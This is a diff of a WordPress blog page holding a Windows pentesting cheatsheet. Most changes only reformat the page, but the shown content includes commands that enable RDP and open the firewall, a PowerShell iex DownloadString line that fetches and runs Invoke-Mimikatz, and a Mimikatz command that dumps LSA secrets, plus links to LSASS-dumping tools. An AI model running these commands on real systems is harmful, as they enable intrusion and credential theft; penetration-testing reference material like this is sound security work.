@@ -8,6 +8,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="template" content="Author 1.49">
 <link rel="dns-prefetch" href="//fonts.googleapis.com">
+<link rel="alternate" type="application/rss+xml" title="\x44\x61\x6e\x6b &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="\x44\x61\x6e\x6b &raquo; Comments Feed" href="/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="\x44\x61\x6e\x6b &raquo; Cheatsheet &#8211; Microsoft Windows Pentesting Comments Feed" href="/2021/07/19/cheatsheet-microsoft-windows/feed/">
 <script type="text/javascript">
 window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.1.1"}};
 /*! This file is auto-generated */
@@ -39,10 +42,13 @@ img.emoji {
 <!--[if IE 8]>
 <script type='text/javascript' src='http://danielkumar.com/wp-content/themes/author/js/build/html5shiv.min.js?ver=6.1.1' id='ct-author-html5-shiv-js'></script>
 <![endif]-->
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="alternate" type="application/json" href="/wp-json/wp/v2/posts/71">
 <link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
 <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml">
 <meta name="generator" content="WordPress 6.1.1">
 <link rel="canonical" href="/2021/07/19/cheatsheet-microsoft-windows/">
+<link rel="shortlink" href="/?p=71">
 <link rel="alternate" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=http%3A%2F%2F%2F2021%2F07%2F19%2Fcheatsheet-microsoft-windows%2F">
 <link rel="alternate" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=http%3A%2F%2F%2F2021%2F07%2F19%2Fcheatsheet-microsoft-windows%2F#038;format=xml">
 </head>
@@ -132,7 +138,9 @@ img.emoji {
 
 
 
-<ul><li>Testing for CLM: </li></ul>
+<ul>
+<li>Testing for CLM: </li>
+</ul>
 
 
 
@@ -140,11 +148,17 @@ img.emoji {
 
 
 
-<ul><li>Enable RDP &amp; Firewall:<ul>
+<ul>
+<li>Enable RDP &#038; Firewall:
+<ul>
 <li>reg add &#8220;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#8221; /v fDenyTSConnections /t REG_DWORD /d 0 /f</li>
+
+
+
 <li>netsh firewall set service type = remotedesktop mode = enable</li>
 </ul>
-</li></ul>
+</li>
+</ul>
 
 
 
@@ -156,7 +170,9 @@ img.emoji {
 
 
 
-<ul><li>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</li></ul>
+<ul>
+<li>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</li>
+</ul>
 
 
 
@@ -170,6 +186,9 @@ img.emoji {
 
 <ul>
 <li>https://github.com/itm4n/PPLdump</li>
+
+
+
 <li>https://github.com/RedCursorSecurityConsulting/PPLKiller</li>
 </ul>
 
@@ -179,7 +198,9 @@ img.emoji {
 
 
 
-<ul><li>https://github.com/outflanknl/Dumpert</li></ul>
+<ul>
+<li>https://github.com/outflanknl/Dumpert</li>
+</ul>
 
 
 
@@ -187,11 +208,17 @@ img.emoji {
 
 
 
-<ul><li>https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz<ul>
+<ul>
+<li>https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz
+<ul>
 <li>iex (New-Object Net.Webclient).DownloadString(&#8220;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1&#8221;)</li>
+
+
+
 <li>Invoke-Mimikatz -Command &#8216;&#8221;token::elevate&#8221; &#8220;lsadump::secrets&#8221;&#8216;</li>
 </ul>
-</li></ul>
+</li>
+</ul>
 					</div>
 		<div class="post-categories">
 <span>Published in</span><a href="/category/cheat-sheet/" title="View all posts in Cheat Sheet">Cheat Sheet</a><a href="/category/windows/" title="View all posts in Windows">Windows</a>
